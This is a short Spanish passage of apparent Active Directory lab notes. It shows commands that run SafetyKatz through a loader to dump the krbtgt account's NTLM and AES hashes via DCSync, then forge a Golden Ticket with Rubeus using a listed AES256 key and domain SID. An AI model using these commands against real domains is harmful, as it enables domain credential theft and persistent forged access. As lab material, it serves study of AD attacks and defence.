Ahora deberemos obtener el hash *NTLM* y los hashes *AES* de la cuenta *krbtgt* utilizando un ataque de *DCSync*, deberemos de hacer un exit hacia tras
```shell
[newShell as Doamin Admin privileges]
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

Ahora deberemos de crear un *Golden Ticket* con *Rubeus*
```shell
[newShell as Doamin Admin privileges]
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648-502 /ldap /user:Administrator /printcmd
```